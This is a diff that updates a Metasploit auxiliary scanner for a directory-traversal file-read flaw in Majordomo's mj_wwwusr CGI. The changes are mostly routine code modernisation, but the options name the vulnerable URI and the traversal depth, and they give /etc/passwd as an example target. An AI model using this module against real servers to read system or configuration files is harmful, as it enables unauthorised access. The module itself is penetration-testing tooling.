@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,7 +22,6 @@ class Metasploit3 < Msf::Auxiliary
           ['OSVDB', '70762'],
           ['CVE', '2011-0049'],
           ['CVE', '2011-0063'],
-          ['URL', 'https://sitewat.ch/en/Advisory/View/1'],
           ['URL', 'http://sotiriu.de/adv/NSOADV-2011-003.txt'],
           ['EDB', '16103']
         ],
@@ -38,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
         OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
         OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -102,5 +98,4 @@ class Metasploit3 < Msf::Auxiliary
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
-
 end
